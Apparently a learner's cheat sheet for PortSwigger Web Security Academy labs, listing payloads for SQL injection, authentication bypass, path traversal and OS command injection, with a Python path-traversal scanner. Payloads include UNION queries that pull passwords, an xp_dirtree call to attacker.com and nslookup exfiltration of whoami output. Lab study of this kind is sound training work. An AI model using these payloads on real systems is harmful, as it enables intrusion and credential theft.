### 01 - SQL Injection

- **Login Form → username parameter**
    - **Vulnerability:** SQL Injection – Login Bypass
        - **Description:** Bypass authentication by injecting into login fields.
        - **Payloads:**
            - `administrator'--`
        - **Relevant Labs:**
            - SQL injection vulnerability allowing login bypass

- **Product Filter → category parameter**    
    - **Vulnerability:** SQL Injection – WHERE Clause Bypass
        - **Description:** Retrieve hidden data by breaking or appending conditions in SQL WHERE clauses.
        - **Payloads:**
            - `' OR '1'='1'--`
        - **Relevant Labs:**
            - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

- **Query Parameter → UNION-based Injection**
    - **Vulnerability:** SQL Injection – UNION SELECT
        - **Techniques:**
            - Determine number of columns:
                - `' ORDER BY 1--`
                - `' UNION SELECT NULL,NULL--`
            - Identify column containing text:
                - `' UNION SELECT NULL,'abc'--`
            - Extract data from other tables:
                - `' UNION SELECT username, password FROM users--`
            - Merge multiple values in one column:
                - `' UNION SELECT NULL, username || ':' || password FROM users--`
        - **Relevant Labs:**
            - SQL injection UNION attack, determining the number of columns returned by the query
            - SQL injection UNION attack, finding a column containing text
            - SQL injection UNION attack, retrieving data from other tables
            - SQL injection UNION attack, retrieving multiple values in a single column

- **Generic Input Field**
    - **Vulnerability:** Blind SQL Injection – Conditional Responses
        - **Description:** Use conditions to infer data from responses (true vs. false queries).
        - **Payloads:**
            - `' AND 1=1--`
            - `' AND 1=2--`
        - **Relevant Labs:**
            - Blind SQL injection with conditional responses
    - **Vulnerability:** Blind SQL Injection – Error-Based
        - **Description:** Use syntax errors to infer application logic or data presence.
        - **Payloads:**
            - `' || (SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM dual)--`
        - **Relevant Labs:**
            - Blind SQL injection with conditional errors
            - Visible error-based SQL injection
    - **Vulnerability:** Blind SQL Injection – Time Delays
        - **Description:** Use `SLEEP()` or `pg_sleep()` to detect data conditions from delayed responses.
        - **Payloads:**
            - `' OR IF(1=1, SLEEP(10), 0)--`
            - `' OR pg_sleep(5)--`
        - **Relevant Labs:**
            - Blind SQL injection with time delays
            - Blind SQL injection with time delays and information retrieval

- **Product Filter → XML-encoded input**

    - **Vulnerability:** SQL Injection – Filter Bypass via Encoding
        - **Description:** Bypass input filters using UTF-8 or XML-encoded characters.
        - **Payloads:**
            - `%27` for `'`
            - `&#x27;` for `'`
        - **Relevant Labs:**
            - SQL injection with filter bypass via XML encoding

- **Tracking Cookie / Header Field**
    - **Vulnerability:** SQL Injection – Out-of-Band (OOB) Interaction
        - **Description:** Use database features to trigger DNS or HTTP requests to exfiltrate data.
        - **Payloads:**
            - Oracle: `SELECT extractvalue(xmltype('<!DOCTYPE ...')...)`
            - MSSQL: `; exec xp_dirtree('//attacker.com/a')--`
        - **Relevant Labs:**
            - Blind SQL injection with out-of-band interaction
            - Blind SQL injection with out-of-band data exfiltration

- **Database-Specific Enumeration**
    - **Vulnerability:** SQL Injection – DB Discovery
        - **Description:** Query system tables to fingerprint DB type and version.
        - **Payloads (Examples):**
            - MySQL/MSSQL: `SELECT @@version`
            - Oracle: `SELECT banner FROM v$version`
        - **Relevant Labs:**
            - SQL injection attack, querying the database type and version on MySQL and Microsoft
            - SQL injection attack, querying the database type and version on Oracle

- **Database Contents**
    - **Vulnerability:** SQL Injection – Schema Enumeration
        - **Description:** List databases and tables through `information_schema` or Oracle's data dictionary.
        - **Payloads:**
            - MySQL: `SELECT table_name FROM information_schema.tables`
            - Oracle: `SELECT table_name FROM all_tables`
        - **Relevant Labs:**
            - SQL injection attack, listing the database contents on non-Oracle databases
            - SQL injection attack, listing the database contents on Oracle

### 02 - Authentication

- **Login Form → username parameter**
    - **Vulnerability:** Username Enumeration – Different Responses
        - **Description:** The application returns different responses for valid and invalid usernames, allowing enumeration.
        - **Techniques:**
            - Burp Intruder: Detect length or content differences.
            - Hydra: Use response keyword matching.
            - Turbo Intruder: Grep response for presence/absence of specific phrases.
        - **Relevant Labs:**
            - Username enumeration via different responses
            - Username enumeration via subtly different responses

- **Login Form → username parameter**
    - **Vulnerability:** Username Enumeration – Account Lock
        - **Description:** Lockout messages only appear for valid usernames after 5 failed attempts.
        - **Techniques:**
            - Brute force with 5 attempts per user.
            - Monitor for lockout-specific error messages.
        - **Relevant Labs:**
            - Username enumeration via account lock

- **Login Form → username parameter**
    - **Vulnerability:** Username Enumeration – Response Timing
        - **Description:** Valid usernames cause longer response times. Detectable by measuring delays.
        - **Techniques:**
            - Use `X-Forwarded-For` to spoof IP and bypass lockout.
            - Compare response time differences.
        - **Relevant Labs:**
            - Username enumeration via response timing

- **Login Form → password parameter**
    - **Vulnerability:** Brute-force Protection Bypass – IP Alternation
        - **Description:** Application enforces IP-based lockout. Bypass via alternating with valid login.
        - **Techniques:**
            - Use valid login to reset failure count.
            - Pitchfork Intruder with alternating usernames.
        - **Relevant Labs:**
            - Broken brute-force protection, IP block

- **Stay Logged In Cookie**
    - **Vulnerability:** Offline Token Cracking – MD5
        - **Description:** Cookie contains base64-encoded `username:md5(password)`, which can be brute-forced offline.
        - **Techniques:**
            - Decode → Crack MD5 → Encode with known username → Test login.
        - **Relevant Labs:**
            - Brute-forcing a stay-logged-in cookie
            - Offline password cracking

- **Change Password → current-password, username**
    - **Vulnerability:** Password Brute-Force via Error Response
        - **Description:** Different errors for invalid password vs. mismatched new passwords leak verification of current-password.
        - **Techniques:**
            - Modify `username` to attack another user.
            - Match response to flag valid attempts.
        - **Relevant Labs:**
            - Password brute-force via password change

- **Forgot Password → X-Forwarded-Host header**
    - **Vulnerability:** Password Reset Link Poisoning
        - **Description:** Reset link uses header for hostname. Allows attacker to intercept victim’s reset.
        - **Techniques:**
            - Poison `X-Forwarded-Host` to exploit server domain.
            - Monitor logs to retrieve tokenized URL.
        - **Relevant Labs:**
            - Password reset poisoning via middleware

- **Login Form → mfa-code parameter**
    - **Vulnerability:** 2FA Bypass – Brute-force of MFA Code
        - **Description:** MFA code is 4-digit numeric and has no brute-force protection.
        - **Techniques:**
            - Use Burp Macros to automate session and CSRF.
            - Brute-force 0000–9999 using Intruder or Python.
        - **Relevant Labs:**
            - 2FA bypass using a brute-force attack

- **Login Form → password parameter**
    - **Vulnerability:** Brute-force Protection Bypass – Multi-Password Submission
        - **Description:** Password field accepts an array of strings. Server tests all passwords at once.
        - **Techniques:**
            - Replace `password` with array of candidate values.
            - Observe login success with a single request.
        - **Relevant Labs:**
            - Broken brute-force protection, multiple credentials per request

### 03 - Path Traversal

- **Check Image → filename parameter**
  - **Vulnerability:** Path Traversal
    - **Description:** The application allows users to retrieve image files via the `filename` parameter in the `/image` endpoint. Insufficient validation of this parameter permits path traversal sequences, enabling unauthorized file access on the server.
    - **Common Payloads:**
      - `../../../../etc/passwd`
      - `../../../etc/passwd`
      - `....//....//etc/passwd`
      - `....\/....\/etc/passwd`
    - **Relevant Labs:**
      - *File path traversal, simple case*

  - **Vulnerability:** Path Traversal – Absolute Path Bypass
    - **Description:** The application blocks relative traversal sequences (e.g., `../`) but fails to prevent direct access to absolute file paths. This allows an attacker to retrieve sensitive files using direct references.
    - **Common Payloads:**
      - `/etc/passwd`
      - `/var/www/html/index.php`
    - **Relevant Labs:**
      - *File path traversal, traversal sequences blocked with absolute path bypass*

  - **Vulnerability:** Path Traversal – Superfluous URL-Decode
    - **Description:** The application attempts to block input containing path traversal sequences by stripping them. However, it performs a URL-decode of the input before using it, which can reintroduce the malicious sequences. This allows an attacker to exploit the vulnerability by encoding the traversal sequences.
    - **Common Payloads:**
      - `....//....//....//etc/passwd`
      - `%2e%2e%2f%2e%2e%2fetc/passwd`
    - **Relevant Labs:**
      - *File path traversal, traversal sequences stripped with superfluous URL-decode*

  - **Vulnerability:** Path Traversal – Null Byte Bypass
    - **Description:** The application checks whether the requested file ends with a valid image extension (e.g., `.jpg`) but does so after applying string functions that stop at null bytes (`%00`). By appending a null byte followed by a valid extension, an attacker can bypass this validation and access arbitrary files.
    - **Common Payloads:**
      - `../../../etc/passwd%00.jpg`
      - `../../../etc/passwd\x00.jpg`
    - **Relevant Labs:**
      - *File path traversal, validation of file extension with null byte bypass*

  - **Vulnerability:** Path Traversal – Base Path Validation Bypass
    - **Description:** The application attempts to validate that requested files are located under a specific base directory (e.g., `/var/www/images/`). However, it fails to account for traversal sequences that start within that base path and move upward. An attacker can bypass the base path check using a crafted path that begins with the base directory but escapes it with `../` sequences.
    - **Common Payloads:**
      - `/var/www/images/../../../etc/passwd`
      - `/var/www/images/../../../../../../etc/passwd`
    - **Relevant Labs:**
      - *File path traversal, validation of start of path*

  - **Tool:** `psptchecker.py`
    - **Purpose:** A Python script designed to automate testing for various path traversal scenarios across multiple bypass techniques covered in the labs.
    - **Script:**
      ```python
      import requests
      import sys

      payloads = [
          "../../../../../../../../../etc/passwd",
          "/etc/passwd",
          "../../../etc/passwd",
          "....\/....\/....\/etc/passwd",
          "....//....//....//etc/passwd",
          "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
          "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
          "/etc/passwd%00.jpg",
          "../../../etc/passwd%00.jpg",
          "/etc/passwd\x00.jpg",
          "../../../etc/passwd\x00.jpg",
          "/var/www/images/../../../etc/passwd"
      ]

      if len(sys.argv) != 2:
          print("Usage: python script.py <URL>")
          sys.exit(1)

      url = sys.argv[1].rstrip('/')
      search_string = "root:x:0:0:root:/root:/bin/bash"

      for payload in payloads:
          target_url = f"{url}/image?filename={payload}"
          try:
              response = requests.get(target_url, timeout=5)
              if search_string in response.text:
                  print("\n[+] LFI Found!")
                  print(f"Payload: {payload}")
                  print("Response:")
                  print(response.text)
                  break
              else:
                  print(f"[-] No LFI with: {payload}")
          except requests.exceptions.RequestException as e:
              print(f"[!] Error requesting {target_url}: {e}")
      ```
    - **Usage:**
      ```bash
      python psptchecker.py https://<your-lab>.web-security-academy.net/
      ```


### 04 - OS Command Injection

- **Check Stock → storeId parameter**
    - **Vulnerability:** OS Command Injection
        - **Description:** The application executes system commands using the value of the storeId parameter in a POST request to /product/stock. Lack of proper input validation allows attackers to inject shell commands using standard chaining operators.
        - **Common Payloads:**
            - `1;whoami`
            - `1|whoami`
            - `1%26whoami`
            - `1%3bwhoami`
        - **Relevant Labs:**
            - _OS Command Injection, Simple Case_
- **Submit Feedback → email / subject parameter**
    - **Vulnerability:** Blind OS Command Injection – Output Redirection
        - **Description:** The application processes user-supplied data and passes it into a backend shell command. Although the response does not show direct output, command injection is possible using output redirection. The output is written to a file inside a web-accessible directory, which can then be fetched to confirm exploitation.
        - **Common Payloads:**
            - `||whoami>/var/www/images/output.txt||`
            - `& whoami > /var/www/images/whoami.txt &`
            - `%26+whoami+%3E+%2Fvar%2Fwww%2Fimages%2Fwhoami.txt+%26`
        - **Retrieve Output:**
            - `https://<lab-id>.web-security-academy.net/image?filename=output.txt`
            - `https://<lab-id>.web-security-academy.net/image?filename=whoami.txt`            
        - **Relevant Labs:**
            - _Blind OS Command Injection with Output Redirection_
- **Submit Feedback → email parameter**
    - **Vulnerability:** Blind OS Command Injection – Time Delays
        - **Description:** The application does not return command output to the client, but executes shell commands with unsanitized user input. Time-based detection techniques are used to confirm command execution by observing artificial delays (e.g., ping, sleep). This is useful when other blind techniques like output redirection are blocked.
        - **Common Payloads:**
            - `& ping -c 10 127.0.0.1 &`
            - `%26+ping+-c+10+127.0.0.1+%26`
            - `| sleep 10 |`
        - **Detection Tips:**
            - Use tools like Burp Repeater to measure response time
            - Run `tcpdump -i [interface] icmp` on attacker machine to detect ping requests
        - **Relevant Labs:**
            - _Blind OS Command Injection with Time Delays_
    - **Vulnerability:** Blind OS Command Injection – Out-of-Band Interaction
        - **Description:** The application does not display command output to the user, but the server still executes injected shell commands. An attacker can confirm this by observing external DNS or HTTP requests generated by the injected command using a Burp Collaborator payload.
        - **Common Payloads:**
            - ``||nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN||``
            - `x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
            - `||nslookup+$(whoami).BURP-COLLABORATOR-SUBDOMAIN||`
        - **Detection Tips:**
            - Use Burp Suite Professional and the Collaborator client
            - Poll Collaborator to verify DNS interaction
            - Look for `whoami` output encoded into subdomain queries
        - **Relevant Labs:**
            - _Blind OS Command Injection with Out-of-Band Interaction_

